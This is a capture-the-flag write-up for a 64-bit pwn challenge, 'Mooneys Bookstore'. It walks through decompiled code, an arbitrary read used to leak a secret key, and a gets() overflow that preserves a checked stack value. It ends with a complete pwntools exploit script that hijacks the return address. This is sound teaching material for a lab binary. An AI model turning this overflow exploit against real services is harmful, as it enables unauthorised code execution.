# Mooneys Bookstore
## Mitigations
```
    Arch:     amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
## Solution

The challenge gives us only a binary [chal](./chal).
When opening the file in Ghidra, we can see that `main` appears as so:

```c
undefined8 main(void)

{
  FILE *ctx;
  long local_18;
  undefined8 *local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  ctx = stdin;
  setvbuf(stdin,(char *)0x0,2,0);
  init((EVP_PKEY_CTX *)ctx);
  puts(&DAT_00402018);
  puts("\nYour favorite book waits for you. Tell me its address");
  read(0,&local_10,8);
  printf("%lx\n",*local_10);
  puts("\nOf course there\'s a key. There always is. If you speak it, the story unlocks");
  read(0,&local_18,8);
  if (local_18 == secret_key) {
    get_input();
  }
  else {
    puts(&DAT_004021b0);
  }
  return 0;
}
```

As we can see, we have an arbitrary read. 

```c
read(0,&local_10,8);
printf("%lx\n",*local_10);
```

Since there is no other vulnerabilities we can exploit here, we can take a look at the `get_input` function:

```c
void get_input(void)

{
  char input [64];
  long local_18;
  FILE *local_10;
  
  local_10 = fopen("/dev/urandom","rb");
  if (local_10 == (FILE *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fread(&val,8,1,local_10);
  fclose(local_10);
  local_18 = val;
  printf("\n\tA post-it on the floor. You would have stepped over it. I didn\'t. It has something fo r you: 0x%lx\n"
         ,val);
  puts("\nYour turn now. Write yourself into this story.");
  fflush(stdout);
  gets(input);
  if (local_18 != val) {
    puts("\nDisappointing. But that\'s you, isn\'t it? Messy. Human. And I stay anyway.");
    fflush(stdout);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}
```

Within this function, there is a gets call! So we can safely assume that is what we'll use to cause a buffer overflow.
Going back to the `main` function, we can see that to get into `get_input`, we need `local_18` to equal `secret_key`.

```c
if (local_18 == secret_key) {
    get_input();
}
```

We know that `secret_key` is a global variable, and thus is not on the stack. However, we can use the arbitrary read within `main` to read the value of `secret_key` and pass that back into `main`!

```py
io = start()

io.recvuntil(b"address")
io.send(p64(0x4040b8)) #The address of the `secret_key`
io.recvline()
s = io.recvline()[:-1]
io.send(p64(int(s,16)))
```

Running our program we get the output:

```
Of course there's a key. There always is. If you speak it, the story unlocks

    A post-it on the floor. You would have stepped over it. I didn't. It has something for you: 0xfa527d1ec734ee72

Your turn now. Write yourself into this story.
```

The hex address in the output appears suspicious, and on a second look at the `get_input` function, we see the line

```c
local_18 = val;
printf("\n\tA post-it on the floor. You would have stepped over it. I didn\'t. It has something fo r you: 0x%lx\n"
    ,val);
puts("\nYour turn now. Write yourself into this story.");
fflush(stdout);
gets(input);
if (local_18 != val) {
    puts("\nDisappointing. But that\'s you, isn\'t it? Messy. Human. And I stay anyway.");
    fflush(stdout);
                    /* WARNING: Subroutine does not return */
    exit(1);
}
```

So it appears that the `local_18` variable needs to equal anolther global variable for our exploit to work. Thankfully, the hex address we saw earlier is that global variable's value! So, all we need to do is read that value and make sure we place it right where `local_18` is on the stack when overflowing the buffer. Taking a look at what the stack looks like (obtained from looking at the assembly in Ghidra) with this function we see that the input buffer is located at -0x58 compared to the return address, while `local_18` is located at -0x18.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined get_input()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[4]:     00401353(W), 
                                                                                                   00401357(R), 
                                                                                                   00401368(R), 
                                                                                                   00401388(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[2]:     0040139b(W), 
                                                                                                   004013f3(R)  
             undefined1[64]    Stack[-0x58]   input                                   XREF[1]:     004013db(*)  
                             get_input                                       XREF[4]:     Entry Point(*), main:00401315(c), 
                                                                                          0040231c, 004023e0(*)  
        00401332 55              PUSH       RBP
```

Combining what we know, we end up with the final solve script.

## Script

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chals.ctf.csaw.io' '--port=21006'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'overflow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chals.ctf.csaw.io'
port = int(args.PORT or 21006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *(get_input+239)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

io.recvuntil(b"address")
io.send(p64(0x4040b8)) #The address of the `secret_key`
io.recvline()
s = io.recvline()[:-1]
io.send(p64(int(s,16)))
io.recvuntil(b"you:")
s2 = io.recvline()[1:-1]
print(s2)
buf = b'a' * (0x58-0x18)
buf = buf + p64(int(s2,16))
#buf = buf + b'a'*0x18
buf = buf + (b'0' * 0x10)
buf = buf + p64(0x401423) +  p64(0x401424)
io.send(buf)

io.interactive()
```

Running this gives us the flag. I do not remember what the flag was and the infrastructure was down at the time of writing this. :P